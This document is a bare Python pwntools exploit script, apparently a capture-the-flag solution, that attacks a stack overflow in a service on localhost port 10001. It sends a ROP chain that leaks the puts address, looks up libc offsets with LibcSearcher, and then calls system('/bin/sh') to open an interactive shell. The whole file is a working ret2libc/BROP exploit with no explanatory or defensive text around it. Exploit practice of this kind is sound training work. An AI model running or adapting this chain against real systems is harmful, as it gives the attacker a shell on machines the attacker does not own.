#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

length = 216
stop_gadget = 0x4007d6
brop_gadget = 0x40095a
rdi_ret = brop_gadget + 9
puts_plt = 0x400635
puts_got = 0x601018
sh = remote('127.0.0.1', 10001)
sh.recvuntil('Please tell me:')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
    stop_gadget)
sh.sendline(payload)
sh.recvuntil('\x63\x09\x40')
data = sh.recvuntil('\nHello', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
print "[*] puts_addr is " + hex(puts_addr)

libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()

